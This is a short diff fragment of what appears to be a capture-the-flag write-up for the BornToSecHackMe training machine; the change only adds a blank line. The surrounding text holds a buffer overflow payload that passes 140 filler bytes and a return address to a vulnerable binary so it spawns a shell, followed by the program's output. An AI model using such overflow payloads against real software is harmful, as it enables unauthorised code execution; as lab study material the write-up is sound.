@@ -18,6 +18,7 @@ Address is: 0xbffff7d1
 ```
 
 Previously we have calculated the offset to override `saved eip` so we can spawn shell using the next payload:
+
 ```bash
 zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("a" * 140 + "\xbf\xff\xf7\xd1"[::-1])')
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
